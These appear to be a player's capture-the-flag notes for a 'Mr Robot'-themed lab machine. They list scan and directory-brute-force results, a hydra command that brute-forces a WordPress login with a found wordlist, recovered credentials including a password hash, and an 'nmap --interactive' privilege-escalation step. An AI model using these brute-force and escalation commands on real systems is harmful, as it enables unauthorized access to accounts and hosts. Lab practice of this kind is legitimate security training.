`export IP=10.10.211.101`

#nmap scan PORT STATE SERVICE 22/tcp closed ssh 80/tcp open http 443/tcp open
https

#gobuster result /images (Status: 301) /index.php (Status: 301) /blog
(Status: 301) /sitemap (Status: 200) /rss (Status: 301) /login (Status: 302) /0
(Status: 301) /feed (Status: 301) /video (Status: 301) /image (Status: 301)
/atom (Status: 301) /wp-content (Status: 301) /admin (Status: 301) /audio
(Status: 301) /intro (Status: 200) /wp-login (Status: 200) /wp-login.php
(Status: 200) /css (Status: 301) /rss2 (Status: 301)

#robots.txt User-agent: \* fsocity.dic key-1-of-3.txt

#hydra
`hydra -l elliot -P fsocity.dic $ip http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.211.101%2Fwp-admin%2F&testcookie=1:The password"`

#creds wp-login.php:80 elliot:ER28-0652 robot:c3fcd3d76192e4007dfb496cca67e13b
`nmap --interactive`
